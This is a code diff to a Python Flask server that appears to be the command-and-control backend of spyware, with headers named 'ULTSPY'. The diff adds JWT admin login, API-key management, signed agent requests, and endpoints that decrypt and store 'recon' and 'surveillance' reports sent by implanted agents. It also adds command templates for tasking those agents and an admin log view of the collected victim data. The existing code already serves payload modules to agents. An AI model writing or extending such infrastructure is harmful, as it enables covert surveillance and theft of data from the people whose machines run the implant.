@@ -5,6 +5,11 @@ import logging
 import base64
 import os
 import json
+import hmac
+import hashlib
+import uuid
+import bcrypt
+import jwt
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
@@ -17,20 +22,146 @@ app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///dduf.db'
 db = SQLAlchemy(app)
 
-logging.basicConfig(level=logging.INFO)
+log_level = os.environ.get('LOG_LEVEL', 'INFO').upper()
+logging.basicConfig(
+    level=getattr(logging, log_level, logging.INFO),
+    format='%(asctime)s %(levelname)s: %(message)s'
+)
 
 TIMEOUT_SECONDS = 180
-ADMIN_API_KEY = os.environ.get('ADMIN_API_KEY', 'changeme')
+API_KEYS = {}
+BACKEND_VERSION = os.environ.get('BACKEND_VERSION', 'dev')
+FRONTEND_VERSION = 'unknown'
+try:
+    pkg_path = os.path.join(os.path.dirname(__file__), '../frontend/package.json')
+    with open(pkg_path, 'r') as f:
+        FRONTEND_VERSION = json.load(f).get('version', 'unknown')
+except Exception:
+    pass
+
+CONFIG = {}
+ALLOWED_HOSTS = []
+JWT_SECRET = None
+if os.path.exists('config.json'):
+    with open('config.json', 'r') as f:
+        try:
+            CONFIG = json.load(f)
+            ALLOWED_HOSTS = CONFIG.get('allowed_hosts', [])
+            JWT_SECRET = CONFIG.get('jwt_secret')
+            API_KEYS = CONFIG.get('api_keys', {})
+        except Exception as e:
+            logging.warning('Failed to load config.json: %s', e)
+
+def migrate_api_keys():
+    cfg_keys = CONFIG.get('api_keys', {})
+    updated = False
+    for name, key in cfg_keys.items():
+        if not ApiKey.query.filter_by(name=name).first():
+            hashed = bcrypt.hashpw(key.encode(), bcrypt.gensalt()).decode()
+            db.session.add(ApiKey(id=str(uuid.uuid4()), name=name, hashed_key=hashed))
+            updated = True
+    if updated:
+        db.session.commit()
+    if cfg_keys:
+        CONFIG.pop('api_keys', None)
+        global API_KEYS
+        API_KEYS = {}
+
+def ensure_admin_key():
+    """Ensure there is at least one admin API key in the database."""
+    existing = ApiKey.query.first()
+    if existing:
+        logging.info('Loaded %d API key(s) from database', ApiKey.query.count())
+        return
+    secret = base64.urlsafe_b64encode(os.urandom(24)).decode()
+    hashed = bcrypt.hashpw(secret.encode(), bcrypt.gensalt()).decode()
+    entry = ApiKey(id=str(uuid.uuid4()), name='admin', hashed_key=hashed)
+    db.session.add(entry)
+    db.session.commit()
+    logging.warning('Generated new admin API key: %s', secret)
 
 
 def require_api_key(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
         key = request.headers.get('X-API-KEY')
-        if key != ADMIN_API_KEY:
+        if not key or key not in API_KEYS.values():
             abort(401)
         return f(*args, **kwargs)
     return wrapper
+
+def require_token(f):
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        auth = request.headers.get('Authorization', '')
+        if not auth.startswith('Bearer '):
+            abort(401)
+        token = auth.split(' ', 1)[1]
+        try:
+            data = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
+        except Exception:
+            abort(401)
+        entry = ApiKey.query.filter_by(id=data.get('kid'), revoked=False).first()
+        if not entry:
+            abort(401)
+        request.token_data = {'id': entry.id, 'name': entry.name}
+        return f(*args, **kwargs)
+    return wrapper
+
+@app.before_request
+def check_host_header():
+    host = request.headers.get('Host', '')
+    if ALLOWED_HOSTS and host not in ALLOWED_HOSTS:
+        logging.warning('Blocked request with host %s', host)
+        abort(404)
+
+NONCE_WINDOW = 50
+
+@app.before_request
+def verify_request():
+    if request.path in ('/key_exchange', '/login') or request.path.startswith('/admin') or request.path.startswith('/config'):
+        return
+    uuid = None
+    if request.view_args:
+        uuid = request.view_args.get('uuid')
+    if not uuid:
+        data = request.get_json(silent=True) or {}
+        uuid = data.get('uuid')
+    if not uuid:
+        return
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        abort(401)
+    sig = request.headers.get('X-ULTSPY-Signature')
+    nonce = request.headers.get('X-ULTSPY-Nonce')
+    ts = request.headers.get('X-ULTSPY-Timestamp')
+    if not sig or not nonce or not ts:
+        abort(401)
+    try:
+        ts_int = int(ts)
+    except ValueError:
+        abort(401)
+    if abs(datetime.utcnow().timestamp() - ts_int) > 60:
+        logging.warning('Timestamp mismatch for %s', uuid)
+        abort(401)
+    if NonceRecord.query.filter_by(client_id=client.id, nonce=nonce).first():
+        logging.warning('Replay attack for %s', uuid)
+        abort(401)
+    url = request.base_url
+    if request.query_string:
+        url += '?' + request.query_string.decode()
+    body = request.get_data(as_text=True) if request.method != 'GET' else ''
+    message = f"{request.method}\n{url}\n{ts}\n{body}"
+    key = base64.b64decode(client.aes_key)
+    expected = hmac.new(key, message.encode(), hashlib.sha256).digest()
+    expected_b64 = base64.b64encode(expected).decode()
+    if not hmac.compare_digest(expected_b64, sig):
+        logging.warning('Bad signature for %s', uuid)
+        abort(401)
+    db.session.add(NonceRecord(client_id=client.id, nonce=nonce))
+    cutoff = datetime.utcnow() - timedelta(minutes=10)
+    NonceRecord.query.filter(NonceRecord.created_at < cutoff).delete()
+    db.session.commit()
 
 class Client(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -52,6 +183,48 @@ class LogEntry(db.Model):
     client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
     message = db.Column(db.String(256))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class NonceRecord(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    nonce = db.Column(db.String(64))
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class ApiKey(db.Model):
+    id = db.Column(db.String(36), primary_key=True)
+    name = db.Column(db.String(128), unique=True, nullable=False)
+    hashed_key = db.Column(db.String(128), nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    revoked = db.Column(db.Boolean, default=False)
+    last_used_at = db.Column(db.DateTime)
+    last_ip = db.Column(db.String(64))
+
+class AuditLog(db.Model):
+    id = db.Column(db.String(36), primary_key=True)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    action = db.Column(db.String(32))
+    key_id = db.Column(db.String(36), db.ForeignKey('api_key.id'))
+    ip = db.Column(db.String(64))
+    notes = db.Column(db.Text)
+
+class ReconData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    data = db.Column(db.Text)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class SurveillanceData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    data = db.Column(db.Text)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class Template(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    template_id = db.Column(db.String(64), unique=True, nullable=False)
+    name = db.Column(db.String(128), unique=True, nullable=False)
+    command = db.Column(db.String(64), nullable=False)
+    parameters = db.Column(db.Text, default='{}')
 
 def log_event(client, message):
     entry = LogEntry(client_id=client.id, message=message)
@@ -80,6 +253,31 @@ def register_client(uuid):
     db.session.commit()
     log_event(client, 'register')
     return client
+
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json(force=True)
+    username = data.get('username', '')
+    password = data.get('password', '')
+    entry = ApiKey.query.filter_by(name=username, revoked=False).first()
+    if entry and bcrypt.checkpw(password.encode(), entry.hashed_key.encode()):
+        entry.last_used_at = datetime.utcnow()
+        entry.last_ip = request.remote_addr
+        db.session.add(AuditLog(id=str(uuid.uuid4()), action='login_success', key_id=entry.id, ip=request.remote_addr))
+        db.session.commit()
+        token = jwt.encode(
+            {
+                'kid': entry.id,
+                'exp': datetime.utcnow() + timedelta(hours=24),
+            },
+            JWT_SECRET,
+            algorithm='HS256',
+        )
+        return jsonify({'token': token})
+    db.session.add(AuditLog(id=str(uuid.uuid4()), action='login_failed', ip=request.remote_addr))
+    db.session.commit()
+    return jsonify({'error': 'unauthorized'}), 401
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -170,6 +368,68 @@ def get_payload(uuid, module):
     return jsonify({'payload': blob})
 
 
+@app.route('/recon/<uuid>', methods=['POST'])
+def recon(uuid):
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        return jsonify({'error': 'unknown'}), 404
+    data = request.get_json(force=True)
+    blob = data.get('data')
+    if not blob:
+        return jsonify({'error': 'invalid'}), 400
+    try:
+        raw = base64.b64decode(blob)
+        key = base64.b64decode(client.aes_key)
+        iv = raw[:16]
+        enc = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        padded = decryptor.update(enc) + decryptor.finalize()
+        unpad = sympadding.PKCS7(128).unpadder()
+        plain = unpad.update(padded) + unpad.finalize()
+        text = plain.decode()
+        if app.debug:
+            logging.info('Recon from %s: %s', uuid, text)
+        rec = ReconData(client_id=client.id, data=text)
+        db.session.add(rec)
+        db.session.commit()
+    except Exception as e:
+        logging.warning('Failed recon decode for %s: %s', uuid, e)
+        return jsonify({'error': 'decode'}), 400
+    return jsonify({'status': 'ok'})
+
+
+@app.route('/surveillance_report/<uuid>', methods=['POST'])
+def surveillance_report(uuid):
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        return jsonify({'error': 'unknown'}), 404
+    data = request.get_json(force=True)
+    blob = data.get('data')
+    if not blob:
+        return jsonify({'error': 'invalid'}), 400
+    try:
+        raw = base64.b64decode(blob)
+        key = base64.b64decode(client.aes_key)
+        iv = raw[:16]
+        enc = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        padded = decryptor.update(enc) + decryptor.finalize()
+        unpad = sympadding.PKCS7(128).unpadder()
+        plain = unpad.update(padded) + unpad.finalize()
+        text = plain.decode()
+        if app.debug:
+            logging.info('Surveillance from %s: %s', uuid, text)
+        rec = SurveillanceData(client_id=client.id, data=text)
+        db.session.add(rec)
+        db.session.commit()
+    except Exception as e:
+        logging.warning('Failed surveillance decode for %s: %s', uuid, e)
+        return jsonify({'error': 'decode'}), 400
+    return jsonify({'status': 'ok'})
+
+
 @app.route('/status/<uuid>', methods=['GET'])
 def status(uuid):
     check_timeouts()
@@ -180,9 +440,29 @@ def status(uuid):
     last = client.last_seen.isoformat() if client.last_seen else None
     return jsonify({'uuid': uuid, 'status': state, 'last_seen': last})
 
+@app.route('/config/targets', methods=['GET'])
+def list_targets():
+    return jsonify({'targets': ALLOWED_HOSTS})
+
+
+@app.route('/admin/config', methods=['GET'])
+@require_token
+def admin_config():
+    keys = [k.name for k in ApiKey.query.filter_by(revoked=False).all()]
+    return jsonify({
+        'api_keys': keys,
+        'heartbeat_timeout': TIMEOUT_SECONDS,
+        'versions': {
+            'backend': BACKEND_VERSION,
+            'frontend': FRONTEND_VERSION,
+        },
+        'targets': ALLOWED_HOSTS,
+        'allowed_hosts': ALLOWED_HOSTS,
+    })
+
 
 @app.route('/admin/agents', methods=['GET'])
-@require_api_key
+@require_token
 def list_agents():
     check_timeouts()
     clients = Client.query.all()
@@ -197,23 +477,163 @@ def list_agents():
 
 
 @app.route('/admin/logs/<uuid>', methods=['GET'])
-@require_api_key
+@require_token
 def agent_logs(uuid):
+    """Return recon reports, surveillance data and log messages for an agent."""
     client = Client.query.filter_by(uuid=uuid).first()
     if not client:
         return jsonify({'logs': []})
-    logs = LogEntry.query.filter_by(client_id=client.id).order_by(LogEntry.created_at.desc()).all()
-    return jsonify({'logs': [
-        {'message': l.message, 'timestamp': l.created_at.isoformat()} for l in logs
-    ]})
+
+    entries = []
+    for l in LogEntry.query.filter_by(client_id=client.id).all():
+        entries.append({
+            'timestamp': l.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'type': 'Info',
+            'description': l.message,
+        })
+
+    for r in ReconData.query.filter_by(client_id=client.id).all():
+        entries.append({
+            'timestamp': r.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'type': 'Recon',
+            'description': 'Recon data',
+            'data': r.data,
+        })
+
+    for s in SurveillanceData.query.filter_by(client_id=client.id).all():
+        entries.append({
+            'timestamp': s.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'type': 'Surveillance',
+            'description': 'Surveillance report',
+            'data': s.data,
+        })
+
+    entries.sort(key=lambda x: x['timestamp'], reverse=True)
+    return jsonify({'logs': entries})
 
 
 @app.route('/admin/command/<uuid>', methods=['POST'])
-@require_api_key
+@require_token
 def admin_command(uuid):
     return add_command(uuid)
 
+
+@app.route('/admin/templates', methods=['GET'])
+@require_token
+def list_templates():
+    entries = Template.query.all()
+    result = []
+    for t in entries:
+        params = json.loads(t.parameters) if t.parameters else {}
+        result.append({
+            'template_id': t.template_id,
+            'name': t.name,
+            'command': t.command,
+            'parameters': params,
+        })
+    return jsonify({'templates': result})
+
+
+@app.route('/admin/templates', methods=['POST'])
+@require_token
+def create_template():
+    data = request.get_json(force=True)
+    name = data.get('name')
+    command = data.get('command')
+    params = data.get('parameters', {})
+    if not name or not command:
+        return jsonify({'error': 'invalid'}), 400
+    if Template.query.filter_by(name=name).first():
+        return jsonify({'error': 'duplicate'}), 409
+    tid = base64.urlsafe_b64encode(os.urandom(12)).decode()
+    entry = Template(
+        template_id=tid,
+        name=name,
+        command=command,
+        parameters=json.dumps(params),
+    )
+    db.session.add(entry)
+    db.session.commit()
+    return jsonify({'template_id': tid})
+
+
+@app.route('/admin/templates/<tid>', methods=['DELETE'])
+@require_token
+def delete_template(tid):
+    entry = Template.query.filter_by(template_id=tid).first()
+    if not entry:
+        return jsonify({'error': 'not found'}), 404
+    db.session.delete(entry)
+    db.session.commit()
+    return jsonify({'status': 'deleted'})
+
+
+@app.route('/admin/audit_logs', methods=['GET'])
+@require_token
+def get_audit_logs():
+    logs = AuditLog.query.order_by(AuditLog.timestamp.desc()).limit(100).all()
+    result = []
+    for l in logs:
+        result.append({
+            'id': l.id,
+            'timestamp': l.timestamp.replace(tzinfo=None).isoformat() + 'Z',
+            'action': l.action,
+            'key_id': l.key_id,
+            'ip': l.ip,
+            'notes': l.notes,
+        })
+    return jsonify({'logs': result})
+
+
+@app.route('/admin/apikeys', methods=['GET'])
+@require_token
+def list_apikeys():
+    entries = ApiKey.query.filter_by(revoked=False).all()
+    result = []
+    for e in entries:
+        result.append({
+            'id': e.id,
+            'name': e.name,
+            'created_at': e.created_at.replace(tzinfo=None).isoformat() + 'Z',
+            'last_used_at': e.last_used_at.replace(tzinfo=None).isoformat() + 'Z' if e.last_used_at else None,
+            'last_ip': e.last_ip,
+        })
+    return jsonify({'keys': result})
+
+
+@app.route('/admin/apikeys', methods=['POST'])
+@require_token
+def create_apikey():
+    data = request.get_json(force=True)
+    name = data.get('name')
+    if not name:
+        return jsonify({'error': 'invalid'}), 400
+    if ApiKey.query.filter_by(name=name).first():
+        return jsonify({'error': 'duplicate'}), 409
+    secret = base64.urlsafe_b64encode(os.urandom(24)).decode()
+    hashed = bcrypt.hashpw(secret.encode(), bcrypt.gensalt()).decode()
+    entry = ApiKey(id=str(uuid.uuid4()), name=name, hashed_key=hashed)
+    db.session.add(entry)
+    db.session.add(AuditLog(id=str(uuid.uuid4()), action='key_created', key_id=entry.id, ip=request.remote_addr))
+    db.session.commit()
+    return jsonify({'id': entry.id, 'secret': secret})
+
+
+@app.route('/admin/apikeys/<aid>', methods=['DELETE'])
+@require_token
+def revoke_apikey(aid):
+    entry = ApiKey.query.filter_by(id=aid).first()
+    if not entry:
+        return jsonify({'error': 'not found'}), 404
+    entry.revoked = True
+    db.session.add(AuditLog(id=str(uuid.uuid4()), action='key_revoked', key_id=entry.id, ip=request.remote_addr))
+    db.session.commit()
+    return jsonify({'status': 'revoked'})
+
+with app.app_context():
+    db.create_all()
+    migrate_api_keys()
+    ensure_admin_key()
+
 if __name__ == '__main__':
-    with app.app_context():
-        db.create_all()
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=False)
